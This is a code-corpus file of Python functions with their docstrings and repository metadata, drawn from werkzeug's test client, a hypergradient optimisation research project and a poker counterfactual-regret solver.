{"docstring": "\"\"\"Return the built environ.\"\"\"\n", "func_signal": "def get_environ(self):\n", "code": "input_stream = self.input_stream\ncontent_length = self.content_length\ncontent_type = self.content_type\n\nif input_stream is not None:\n    start_pos = input_stream.tell()\n    input_stream.seek(0, 2)\n    end_pos = input_stream.tell()\n    input_stream.seek(start_pos)\n    content_length = end_pos - start_pos\nelif content_type == 'multipart/form-data':\n    values = CombinedMultiDict([self.form, self.files])\n    input_stream, content_length, boundary = \\\n        stream_encode_multipart(values, charset=self.charset)\n    content_type += '; boundary=\"%s\"' % boundary\nelif content_type == 'application/x-www-form-urlencoded':\n    values = url_encode(self.form, charset=self.charset)\n    content_length = len(values)\n    input_stream = StringIO(values)\nelse:\n    input_stream = _empty_stream\n\nresult = {}\nif self.environ_base:\n    result.update(self.environ_base)\n\ndef _path_encode(x):\n    if isinstance(x, unicode):\n        x = x.encode(self.charset)\n    return _unquote(x)\n\nresult.update({\n    'REQUEST_METHOD':       self.method,\n    'SCRIPT_NAME':          _path_encode(self.script_root),\n    'PATH_INFO':            _path_encode(self.path),\n    'QUERY_STRING':         self.query_string,\n    'SERVER_NAME':          self.server_name,\n    'SERVER_PORT':          str(self.server_port),\n    'HTTP_HOST':            self.host,\n    'SERVER_PROTOCOL':      self.server_protocol,\n    'CONTENT_TYPE':         content_type or '',\n    'CONTENT_LENGTH':       str(content_length or '0'),\n    'wsgi.version':         self.wsgi_version,\n    'wsgi.url_scheme':      self.url_scheme,\n    'wsgi.input':           input_stream,\n    'wsgi.errors':          self.errors_stream,\n    'wsgi.multithread':     self.multithread,\n    'wsgi.multiprocess':    self.multiprocess,\n    'wsgi.run_once':        self.run_once\n})\nfor key, value in self.headers.to_list(self.charset):\n    result['HTTP_%s' % key.upper().replace('-', '_')] = value\nif self.environ_overrides:\n    result.update(self.environ_overrides)\nreturn result", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like open but method is enforced to DELETE.\"\"\"\n", "func_signal": "def delete(self, *args, **kw):\n", "code": "kw['method'] = 'DELETE'\nreturn self.open(*args, **kw)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like open but method is enforced to POST.\"\"\"\n", "func_signal": "def post(self, *args, **kw):\n", "code": "kw['method'] = 'POST'\nreturn self.open(*args, **kw)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Returns a request with the data.  If the request class is not\nspecified :attr:`request_class` is used.\n\n:param cls: The request wrapper to use.\n\"\"\"\n", "func_signal": "def get_request(self, cls=None):\n", "code": "if cls is None:\n    cls = self.request_class\nreturn cls(self.get_environ())", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"The server port as integer (read-only, use :attr:`host` to set)\"\"\"\n", "func_signal": "def server_port(self):\n", "code": "pieces = self.host.split(':', 1)\nif len(pieces) == 2 and pieces[1].isdigit():\n    return int(pieces[1])\nelif self.url_scheme == 'https':\n    return 443\nreturn 80", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Extract the server's set-cookie headers as cookies into the\ncookie jar.\n\"\"\"\n", "func_signal": "def extract_wsgi(self, environ, headers):\n", "code": "self.extract_cookies(\n    _TestCookieResponse(headers),\n    U2Request(get_current_url(environ)),\n)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like open but method is enforced to PATCH.\"\"\"\n", "func_signal": "def patch(self, *args, **kw):\n", "code": "kw['method'] = 'PATCH'\nreturn self.open(*args, **kw)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Convert a MySQL's 64 bit, variable length binary string to a long.\n\"\"\"\n\n", "func_signal": "def result_processor(self, dialect, coltype):\n", "code": "def process(value):\n    if value is not None:\n        v = 0\n        for i in util.iterbytes(value):\n            v = v << 8 | i\n        return v\n    return value\nreturn process", "path": "libs\\sqlalchemy\\dialects\\mysql\\cymysql.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Deletes a cookie in the test client.\"\"\"\n", "func_signal": "def delete_cookie(self, server_name, key, path='/', domain=None):\n", "code": "self.set_cookie(server_name, key, expires=0, max_age=0,\n                path=path, domain=domain)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Create a new WSGI environ dict based on the values passed.  The first\nparameter should be the path of the request which defaults to '/'.  The\nsecond one can either be an absolute path (in that case the host is\nlocalhost:80) or a full path to the request with scheme, netloc port and\nthe path to the script.\n\nThis accepts the same arguments as the :class:`EnvironBuilder`\nconstructor.\n\n.. versionchanged:: 0.5\n   This function is now a thin wrapper over :class:`EnvironBuilder` which\n   was added in 0.5.  The `headers`, `environ_base`, `environ_overrides`\n   and `charset` parameters were added.\n\"\"\"\n", "func_signal": "def create_environ(*args, **kwargs):\n", "code": "builder = EnvironBuilder(*args, **kwargs)\ntry:\n    return builder.get_environ()\nfinally:\n    builder.close()", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Like open but method is enforced to HEAD.\"\"\"\n", "func_signal": "def head(self, *args, **kw):\n", "code": "kw['method'] = 'HEAD'\nreturn self.open(*args, **kw)", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Takes the same arguments as the :class:`EnvironBuilder` class with\nsome additions:  You can provide a :class:`EnvironBuilder` or a WSGI\nenvironment as only argument instead of the :class:`EnvironBuilder`\narguments and two optional keyword arguments (`as_tuple`, `buffered`)\nthat change the type of the return value or the way the application is\nexecuted.\n\n.. versionchanged:: 0.5\n   If a dict is provided as file in the dict for the `data` parameter\n   the content type has to be called `content_type` now instead of\n   `mimetype`.  This change was made for consistency with\n   :class:`werkzeug.FileWrapper`.\n\n    The `follow_redirects` parameter was added to :func:`open`.\n\nAdditional parameters:\n\n:param as_tuple: Returns a tuple in the form ``(environ, result)``\n:param buffered: Set this to True to buffer the application run.\n                 This will automatically close the application for\n                 you as well.\n:param follow_redirects: Set this to True if the `Client` should\n                         follow HTTP redirects.\n\"\"\"\n", "func_signal": "def open(self, *args, **kwargs):\n", "code": "as_tuple = kwargs.pop('as_tuple', False)\nbuffered = kwargs.pop('buffered', False)\nfollow_redirects = kwargs.pop('follow_redirects', False)\nenviron = None\nif not kwargs and len(args) == 1:\n    if isinstance(args[0], EnvironBuilder):\n        environ = args[0].get_environ()\n    elif isinstance(args[0], dict):\n        environ = args[0]\nif environ is None:\n    builder = EnvironBuilder(*args, **kwargs)\n    try:\n        environ = builder.get_environ()\n    finally:\n        builder.close()\n\nif self.cookie_jar is not None:\n    self.cookie_jar.inject_wsgi(environ)\nrv = run_wsgi_app(self.application, environ, buffered=buffered)\nif self.cookie_jar is not None:\n    self.cookie_jar.extract_wsgi(environ, rv[2])\n\n# handle redirects\nredirect_chain = []\nstatus_code = int(rv[1].split(None, 1)[0])\nwhile status_code in (301, 302, 303, 305, 307) and follow_redirects:\n    if not self.redirect_client:\n        # assume that we're not using the user defined response wrapper\n        # so that we don't need any ugly hacks to get the status\n        # code from the response.\n        self.redirect_client = Client(self.application)\n        self.redirect_client.cookie_jar = self.cookie_jar\n\n    redirect = dict(rv[2])['Location']\n\n    scheme, netloc, script_root, qs, anchor = urlparse.urlsplit(redirect)\n    base_url = urlparse.urlunsplit((scheme, netloc, '', '', '')).rstrip('/') + '/'\n\n    cur_server_name = netloc.split(':', 1)[0].split('.')\n    real_server_name = get_host(environ).split(':', 1)[0].split('.')\n\n    if self.allow_subdomain_redirects:\n        allowed = cur_server_name[-len(real_server_name):] == real_server_name\n    else:\n        allowed = cur_server_name == real_server_name\n\n    if not allowed:\n        raise RuntimeError('%r does not support redirect to '\n                           'external targets' % self.__class__)\n\n    redirect_chain.append((redirect, status_code))\n\n    # the redirect request should be a new request, and not be based on\n    # the old request\n\n    redirect_kwargs = {\n        'path':             script_root,\n        'base_url':         base_url,\n        'query_string':     qs,\n        'as_tuple':         True,\n        'buffered':         buffered,\n        'follow_redirects': False,\n    }\n    environ, rv = self.redirect_client.open(**redirect_kwargs)\n    status_code = int(rv[1].split(None, 1)[0])\n\n    # Prevent loops\n    if redirect_chain[-1] in redirect_chain[:-1]:\n        raise ClientRedirectError(\"loop detected\")\n\nresponse = self.response_wrapper(*rv)\nif as_tuple:\n    return environ, response\nreturn response", "path": "libs\\werkzeug\\test.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Interpret a filename as either a filesystem location or as a package resource.\n\nNames that are non absolute paths and contain a colon\nare interpreted as resources and coerced to a file location.\n\n\"\"\"\n", "func_signal": "def coerce_resource_to_filename(fname):\n", "code": "if not os.path.isabs(fname) and \":\" in fname:\n    import pkg_resources\n    fname = pkg_resources.resource_filename(*fname.split(':'))\nreturn fname", "path": "libs\\alembic\\util.py", "repo_name": "deepgully/me", "stars": 278, "license": "None", "language": "python", "size": 7424}
{"docstring": "\"\"\"Retrieves the last integer stored.\"\"\"\n", "func_signal": "def pop(self, M):\n", "code": "N = self.store % M\nself.store /= M\nreturn N", "path": "hypergrad\\exact_rep.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Stochastic gradient descent with momentum.\ngrad() has signature grad(x, i), where i is the iteration.\"\"\"\n", "func_signal": "def simple_sgd(grad, x, callback=None, num_iters=200, step_size=0.1, mass=0.9):\n", "code": "velocity = np.zeros(len(x))\nfor i in xrange(num_iters):\n    g = grad(x, i)\n    if callback: callback(x, i, g)\n    velocity = mass * velocity - (1.0 - mass) * g\n    x += step_size * velocity\nreturn x", "path": "hypergrad\\optimizers.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Shuffles both data and label indices\n", "func_signal": "def shuffle_alphabet(alphabet, RS):\n", "code": "N_rows, N_cols = alphabet['T'].shape\nalphabet['T'] = alphabet['T'][:, RS.permutation(N_cols)]\nreturn dictslice(alphabet, RS.permutation(N_rows))", "path": "experiments\\Jan_27_first_omniglot_expt\\5\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Turns x into a stepwise constant function with step length L\n", "func_signal": "def step_smooth(x, L):\n", "code": "N = len(x)\ny = np.zeros(N)\ni = 0\nwhile i < N:\n    idxs = slice(i, i+L)\n    y[idxs] = np.mean(x[idxs])\n    i += L\nreturn y", "path": "experiments\\Jan_15_optimize_learning_rate_schedule\\3\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Remove the redundancy due to sharing transformations within units\n", "func_signal": "def process_transform(t_vect):\n", "code": "all_t = w_parser.new_vect(t_vect)\nnew_t = np.zeros((0,))\nfor i in range(N_layers):\n    layer = all_t[('weights', i)]\n    assert np.all(layer[:, 0] == layer[:, 1])\n    cur_t = log_L2 - 2 * layer[:, 0]\n    new_t = np.concatenate((new_t, cur_t))\nreturn new_t", "path": "experiments\\Feb_5_regularization_granularity\\2\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Same as sgd2 but simplifies things by not bothering with grads of\noptimizing loss (can always just pass that in as the secondary loss)\"\"\"\n", "func_signal": "def sgd3_naive(optimizing_loss, x, v, alphas, betas, meta, fwd_callback=None, reverse_callback=None):\n", "code": "x = x.astype(np.float16)\nv = v.astype(np.float16)\nL_grad = grad(optimizing_loss)  # Gradient wrt parameters.\niters = zip(range(len(alphas)), alphas, betas)\n\n# Forward pass\nfor i, alpha, beta in iters:\n    if fwd_callback: fwd_callback(x, i)\n    g = L_grad(x, meta, i)\n    v = v * beta\n    v = v - ((1.0 - beta) * g)\n    x = x + alpha * v\n    x = x.astype(np.float16)\n    v = v.astype(np.float16)\n\n# Reverse pass\nfor i, alpha, beta in iters[::-1]:\n    x = x - alpha * v\n    g = L_grad(x, meta, i)\n    v = v + (1.0 - beta) * g\n    v = v / beta\n    if reverse_callback: reverse_callback(x, i)\n    x = x.astype(np.float16)\n    v = v.astype(np.float16)", "path": "experiments\\Jan_25_Figure_1\\4_naive_reverse\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Returns height of inverse cdf, and gradients of output w.r.t. bin heights.\n   this is a matrix, rows are different inputs, columns are different bins.\"\"\"\n", "func_signal": "def bininvcdf(x, bins):\n", "code": "assert np.all(np.sort(bins) == bins)  # Bin heights must be sorted.\nedges = np.linspace(0, 1, len(bins))\ndy_dbin = np.zeros((len(x), len(bins)))\ny = np.zeros(len(x))\nfor ix, (left, right, bottom, top) \\\n        in enumerate(zip(edges[:-1], edges[1:], bins[:-1], bins[1:])):\n    cur = np.where((left <= x) * (x < right))\n    frac = (x[cur] - left) / (right - left)\n    y[cur] = bottom + frac  * (top - bottom)\n    dy_dbin[cur, ix    ] = 1 - frac\n    dy_dbin[cur, ix + 1] = frac\nreturn y, dy_dbin\n\n# Divide points into\nreturn [np.mean(x[i:(i+L)]) for i in range(0, len(x), L)]", "path": "experiments\\Jan_16_optimize_initial_dist\\3\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"This version has alphas and betas be TxN_weight_types matrices.\n   parser is a dict containing the indices for the different types of weights.\"\"\"\n", "func_signal": "def sgd_parsed(L_grad, hypers, parser, callback=None, forward_pass_only=True):\n", "code": "x0, alphas, betas, meta = hypers\nX, V = ExactRep(x0), ExactRep(np.zeros(x0.size))\niters = zip(range(len(alphas)), alphas, betas)\nfor i, alpha, beta in iters:\n    g = L_grad(X.val, meta, i)\n    if callback: callback(X.val, V.val, g, i)\n    cur_alpha_vect = fill_parser(parser, alpha)\n    cur_beta_vect  = fill_parser(parser, beta)\n    V.mul(cur_beta_vect).sub((1.0 - cur_beta_vect) * g)\n    X.add(cur_alpha_vect * V.val)\nx_final = X.val\n\nif forward_pass_only:\n    return x_final\n\ndef hypergrad(outgrad):\n    d_x = outgrad\n    d_alphas, d_betas = np.zeros(alphas.shape), np.zeros(betas.shape)\n    d_v, d_meta = np.zeros(d_x.shape), np.zeros(meta.shape)\n    grad_proj = lambda x, meta, d, i: np.dot(L_grad(x, meta, i), d)\n    L_hvp_x    = grad(grad_proj, 0)  # Returns a size(x) output.\n    L_hvp_meta = grad(grad_proj, 1)  # Returns a size(meta) output.\n    for i, alpha, beta in iters[::-1]:\n\n        # build alpha and beta vector\n        cur_alpha_vect = fill_parser(parser, alpha)\n        cur_beta_vect  = fill_parser(parser, beta)\n        for j, (_, (ixs, _)) in enumerate(parser.idxs_and_shapes.iteritems()):\n            d_alphas[i,j] = np.dot(d_x[ixs], V.val[ixs])\n\n        X.sub(cur_alpha_vect * V.val)                        # Reverse position update\n        g = L_grad(X.val, meta, i)                           # Evaluate gradient\n        V.add((1.0 - cur_beta_vect) * g).div(cur_beta_vect)  # Reverse momentum update\n\n        d_v += d_x * cur_alpha_vect\n\n        for j, (_, (ixs, _)) in enumerate(parser.idxs_and_shapes.iteritems()):\n            d_betas[i,j] = np.dot(d_v[ixs], V.val[ixs] + g[ixs])\n\n        d_x    -= L_hvp_x(X.val, meta, (1.0 - cur_beta_vect)*d_v, i)\n        d_meta -= L_hvp_meta(X.val, meta, (1.0 - cur_beta_vect)* d_v, i)\n        d_v    *= cur_beta_vect\n    assert np.all(ExactRep(x0).val == X.val)\n    return d_x, d_alphas, d_betas, d_meta\n\nreturn x_final, [None, hypergrad]", "path": "hypergrad\\optimizers.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Remove the redundancy due to sharing transformations within units\n", "func_signal": "def process_transform(t_vect):\n", "code": "all_t = w_parser.new_vect(t_vect)\nnew_t = np.zeros((0,))\nfor i in range(N_layers):\n    layer = all_t[('weights', i)]\n    assert np.all(layer[:, 0] == layer[:, 1])\n    cur_t = log_L2 - 2 * layer[:, 0]\n    new_t = np.concatenate((new_t, cur_t))\nreturn new_t", "path": "experiments\\Feb_5_regularization_granularity\\4\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Shuffles both data and label indices\n", "func_signal": "def shuffle_alphabet(alphabet, RS):\n", "code": "N_rows, N_cols = alphabet['T'].shape\nalphabet['T'] = alphabet['T'][:, RS.permutation(N_cols)]\nreturn dictslice(alphabet, RS.permutation(N_rows))", "path": "experiments\\Jan_27_first_omniglot_expt\\2\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"x is a set of locations at which to evaluate the pdf.\"\"\"\n", "func_signal": "def binpdf(x, bins):\n", "code": "assert np.all(np.sort(bins) == bins)  # Bin heights must be sorted.\nedges = np.linspace(0, 1, len(bins))\ny = np.zeros(len(x))\nfor ix, (left, right, bottom, top) \\\n        in enumerate(zip(edges[:-1], edges[1:], bins[:-1], bins[1:])):\n    cur = np.where((bottom <= x) * (x < top))\n    y[cur] = (right - left) / (top - bottom)\nreturn y", "path": "experiments\\Jan_16_optimize_initial_dist\\4\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Reversible addition of vector or scalar A.\"\"\"\n", "func_signal": "def add(self, A):\n", "code": "self.intrep += self.float_to_intrep(A)\nreturn self", "path": "hypergrad\\exact_rep.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Test if an exact rep can be multiplied and divided elementwise with a vector.\"\"\"\n", "func_signal": "def test_mul_div_with_vector():\n", "code": "A = npr.randn(100)\nB = npr.rand(100)\n\nexact_A = ExactRep(A)\norig_value = exact_A.val\nexact_A.mul(B)\nassert np.allclose(exact_A.val, A*B, rtol=1e-3, atol=1e-4)\nexact_A.div(B)\nassert all(exact_A.val == orig_value)", "path": "tests\\test_exact_rep.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Returns height of inverse cdf, and gradients of output w.r.t. bin heights.\n   this is a matrix, rows are different inputs, columns are different bins.\"\"\"\n", "func_signal": "def bininvcdf(x, bins):\n", "code": "assert np.all(np.sort(bins) == bins)  # Bin heights must be sorted.\nedges = np.linspace(0, 1, len(bins))\ndy_dbin = np.zeros((len(x), len(bins)))\ny = np.zeros(len(x))\nfor ix, (left, right, bottom, top) \\\n        in enumerate(zip(edges[:-1], edges[1:], bins[:-1], bins[1:])):\n    cur = np.where((left <= x) * (x < right))\n    frac = (x[cur] - left) / (right - left)\n    y[cur] = bottom + frac  * (top - bottom)\n    dy_dbin[cur, ix    ] = 1 - frac\n    dy_dbin[cur, ix + 1] = frac\nreturn y, dy_dbin\n\n# Divide points into\nreturn [np.mean(x[i:(i+L)]) for i in range(0, len(x), L)]", "path": "experiments\\Jan_16_optimize_initial_dist\\4\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Computes the negative log prob per data point.\"\"\"\n", "func_signal": "def weighted_neighbors_loss(train_data, valid_data, kernel):\n", "code": "X_train, T_train = train_data\nX_valid, T_valid = valid_data\nweight_mat = kernel(X_valid, X_train)\nlabel_probs = np.dot(weight_mat, T_train)\nlabel_probs = label_probs / np.sum(label_probs, axis=1, keepdims=True)\nmean_neg_log_prob = - np.mean(np.log(np.sum(label_probs * T_valid,\n                                          axis=1)), axis=0)\nreturn mean_neg_log_prob", "path": "hypergrad\\kernel_methods.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Same as sgd2 but simplifies things by not bothering with grads of\noptimizing loss (can always just pass that in as the secondary loss)\"\"\"\n", "func_signal": "def sgd3(optimizing_loss, secondary_loss, x0, v0, alphas, betas, meta, callback=None):\n", "code": "X, V = ExactRep(x0), ExactRep(v0)\nL_grad = grad(optimizing_loss)  # Gradient wrt parameters.\ngrad_proj = lambda x, meta, d, i: np.dot(L_grad(x, meta, i), d)\nL_hvp_x    = grad(grad_proj, 0) # Returns a size(x) output.\nL_hvp_meta = grad(grad_proj, 1) # Returns a size(meta) output.\niters = zip(range(len(alphas)), alphas, betas)\nfor i, alpha, beta in iters:\n    if callback: callback(X.val, i)\n    g = L_grad(X.val, meta, i)\n    V.mul(beta).sub((1.0 - beta) * g)\n    X.add(alpha * V.val)\nx_final = X.val\nM_grad      = grad(secondary_loss, 0)  # Gradient wrt parameters.\nM_meta_grad = grad(secondary_loss, 1)  # Gradient wrt metaparameters.\ndMd_x = M_grad(X.val, meta)\ndMd_v = np.zeros(dMd_x.shape)\ndMd_alphas = deque()\ndMd_betas  = deque()\ndMd_meta = M_meta_grad(X.val, meta)\nfor i, alpha, beta in iters[::-1]:\n    dMd_alphas.appendleft(np.dot(dMd_x, V.val))\n    X.sub(alpha * V.val)\n    g = L_grad(X.val, meta, i)\n    V.add((1.0 - beta) * g).div(beta)\n    dMd_v += dMd_x * alpha\n    dMd_betas.appendleft(np.dot(dMd_v, V.val + g))\n    dMd_x    -= (1.0 - beta) * L_hvp_x(X.val, meta, dMd_v, i)\n    dMd_meta -= (1.0 - beta) * L_hvp_meta(X.val, meta, dMd_v, i)\n    dMd_v    *= beta\n\nassert np.all(ExactRep(x0).val == X.val)\nreturn {'x_final' : x_final,\n        'dMd_x'      : dMd_x,\n        'dMd_v'      : dMd_v,\n        'dMd_alphas' : dMd_alphas,\n        'dMd_betas'  : dMd_betas,\n        'dMd_meta'   : dMd_meta}", "path": "hypergrad\\optimizers.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "\"\"\"Stores integer N, given that 0 <= N < M\"\"\"\n", "func_signal": "def push(self, N, M):\n", "code": "assert np.all(M <= 2**16)\nself.store *= M\nself.store += N", "path": "hypergrad\\exact_rep.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Remove the redundancy due to sharing transformations within units\n", "func_signal": "def process_transform(t_vect):\n", "code": "all_t = w_parser.new_vect(t_vect)\nnew_t = np.zeros((0,))\nfor i in range(N_layers):\n    layer = all_t[('weights', i)]\n    assert np.all(layer[:, 0] == layer[:, 1])\n    cur_t = np.exp(log_L2) / layer[:, 0]**2\n    new_t = np.concatenate((new_t, cur_t))\nreturn new_t", "path": "experiments\\Feb_5_regularization_granularity\\1\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Jobs didn't finish, but here are the results grepped from stdout files (after 600 iterations)\n", "func_signal": "def plot():\n", "code": "train_loss, valid_loss = zip(*[( 1.18981821808,  2.44209621532 ),\n                               ( 1.32133787107,  2.47207029118 ),\n                               ( 1.48092102979,  2.51644325327 ),\n                               ( 1.6721216284,  2.57854067933 ),\n                               ( 1.88463380972,  2.65262902885 ),\n                               ( 2.06526062967,  2.70579907853 ),\n                               ( 2.14729400176,  2.70467654679 ),\n                               ( 2.1593192532,  2.6762408726 ),\n                               ( 2.16106019828,  2.65861610487 ),\n                               ( 2.1636410108,  2.6552748234 )])\n\nimport matplotlib.pyplot as plt\nimport matplotlib as mpl\n# with open('results.pkl') as f:\n#      train_loss, valid_loss = zip(*pickle.load(f))\n\nfig = plt.figure(0)\nfig.set_size_inches((6,4))\nax = fig.add_subplot(111)\nax.set_title('Performance vs weight_sharing')\nax.plot(all_script_corr, train_loss, 'o-', label='train_loss')\nax.plot(all_script_corr, valid_loss, 'o-', label='valid_loss')\nax.set_xlabel('Weight sharing')\nax.set_ylabel('Negative log prob')\nax.legend(loc=1, frameon=False)\nplt.savefig('performance.png')", "path": "experiments\\Jan_31_multitask_as_L2\\2\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# print \"Meta iter {0}. Recording results\".format(i_hyper)\n", "func_signal": "def record_results(hyperparam_vect, i_hyper, g):\n", "code": "RS = RandomState((seed, i_hyper, \"evaluation\"))\nnew_seed = RS.int32()\ndef loss_fun(alphabets, report_train_loss):\n    return np.mean([hyperloss(hyperparam_vect, new_seed, alphabets=alphabets,\n                              verbose=False, report_train_loss=report_train_loss)\n                    for i in range(N_alphabets_eval)])\ncur_hyperparams = hyperparams_0.new_vect(hyperparam_vect.copy())\nif i_hyper % N_hyper_thin == 0:\n    # Storing O(N_weights) is a bit expensive so we thin it out and store in low precision\n    for field in cur_hyperparams.names:\n        results[field].append(cur_hyperparams[field].astype(np.float16))\nresults['train_loss'].append(loss_fun(train_alphabets, report_train_loss=True))\nresults['valid_loss'].append(loss_fun(train_alphabets, report_train_loss=False))", "path": "experiments\\Jan_27_first_omniglot_expt\\2\\experiment.py", "repo_name": "HIPS/hypergrad", "stars": 292, "license": "None", "language": "python", "size": 197086}
{"docstring": "# Number of community cards dealt this round\n", "func_signal": "def cfr_boardcard_node(self, root, reachprobs):\n", "code": "num_dealt = len(root.children[0].board) - len(root.board)\n# Find the child that matches the sampled board card(s)\nfor bc in root.children:\n    if self.boardmatch(num_dealt, bc):\n        # Perform normal CFR\n        results = self.cfr_helper(bc, reachprobs)\n        # Return the payoffs\n        return results\nraise Exception('Sampling from impossible board card')", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Assume everyone is in\n", "func_signal": "def build(self):\n", "code": "players_in = [True] * self.rules.players\n# Collect antes\ncommitted = [self.rules.ante] * self.rules.players\nbets = [0] * self.rules.players\n# Collect blinds\nnext_player = self.collect_blinds(committed, bets, 0)\nholes = [[()]] * self.rules.players\nboard = ()\nbet_history = \"\"\nself.root = self.build_rounds(None, players_in, committed, holes, board, self.rules.deck, bet_history, 0, bets, next_player)", "path": "pokertrees.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Number of community cards dealt this round\n", "func_signal": "def cfr_boardcard_node(self, root, reachprobs, sampleprobs):\n", "code": "num_dealt = len(root.children[0].board) - len(root.board)\n# Find the child that matches the sampled board card(s)\nfor bc in root.children:\n    if self.boardmatch(num_dealt, bc):\n        # Perform normal CFR\n        results = self.cfr_helper(bc, reachprobs, sampleprobs)\n        # Return the payoffs\n        return results\nraise Exception('Sampling from impossible board card')", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "\"\"\"\nConvert the lookup_tables.Card representation to a binary\nrepresentation for use in 6-card hand evaluation\n\"\"\"\n# This a variant on Cactus Kev's algorithm. We need to replace\n# the 4-bit representation of suit with a prime number representation\n# so we can look up whether something is a flush by prime product\n        \n# First we need to generate the following representation\n# Bits marked x are not used.\n# xxxbbbbb bbbbbbbb qqqqrrrr xxpppppp\n        \n# b is one bit flipped for A-2\n# q is 2, 3, 5, or 7 for spades, hearts, clubs, diamonds\n# r is just the numerical rank in binary, with deuce = 0\n# p is the prime from LookupTable.primes corresponding to the rank,\n# in binary\n# Then shift appropriately to fit the template above\n", "func_signal": "def card_to_binary(card):\n", "code": "b_mask = 1 << (14 + card.rank)\nq_mask = LookupTables.primes[card.suit - 1] << 12\nr_mask = (card.rank - 2) << 8\np_mask = LookupTables.primes[card.rank - 2]\n# OR them together to get the final result\nreturn b_mask | q_mask | r_mask | p_mask", "path": "hand_evaluator.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Calculate strategy from counterfactual regret\n", "func_signal": "def cfr_action_node(self, root, reachprobs, sampleprobs):\n", "code": "strategy = self.cfr_strategy_update(root, reachprobs, sampleprobs)\nhc = self.holecards[root.player][0:len(root.holecards[root.player])]\ninfoset = self.rules.infoset_format(root.player, hc, root.board, root.bet_history)\naction_probs = strategy.probs(infoset)\nif random.random() < self.exploration:\n    action = self.random_action(root)\nelse:\n    action = strategy.sample_action(infoset)\nreachprobs[root.player] *= action_probs[action]\ncsp = self.exploration * (1.0 / len(root.children)) + (1.0 - self.exploration) * action_probs[action]\npayoffs = self.cfr_helper(root.get_child(action), reachprobs, sampleprobs * csp)\n# Update regret calculations\nself.cfr_regret_update(root, payoffs[root.player], action, action_probs[action])\npayoffs[root.player] *= action_probs[action]\nreturn payoffs", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
{"docstring": "# Checks if this node is a match for the sampled board card(s)\n", "func_signal": "def boardmatch(self, num_dealt, node):\n", "code": "for next_card in range(0, len(node.board)):\n    if self.board[next_card] not in node.board:\n        return False\nreturn True", "path": "pokercfr.py", "repo_name": "tansey/pycfr", "stars": 266, "license": "None", "language": "python", "size": 1102}
